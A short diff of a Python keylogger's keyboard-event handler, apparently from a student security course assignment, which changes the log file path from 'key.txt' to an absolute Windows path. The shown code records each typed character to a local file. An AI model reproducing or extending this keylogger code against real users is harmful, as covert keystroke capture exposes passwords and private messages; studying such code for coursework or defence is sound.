@@ -13,10 +13,10 @@ def OnKeyboardEvent(event):
             exit(1)
         if event.Ascii != 0 or event.Ascii == 8:
             # open output.txt to read current keystrokes
-            with open('key.txt', 'r+') as f:
+            with open("C:/Users/neera/OneDrive/Documents/MITWPU/ICS/ICS LCA/key.txt", 'r+') as f:
                 buffer = f.read()
             # open output.txt to write current + new keystrokes
-            with open('key.txt', 'w') as f:
+            with open("C:/Users/neera/OneDrive/Documents/MITWPU/ICS/ICS LCA/key.txt", 'w') as f:
                 keylogs = chr(event.Ascii)
                 if event.Ascii == 13:
                     keylogs = '\n'
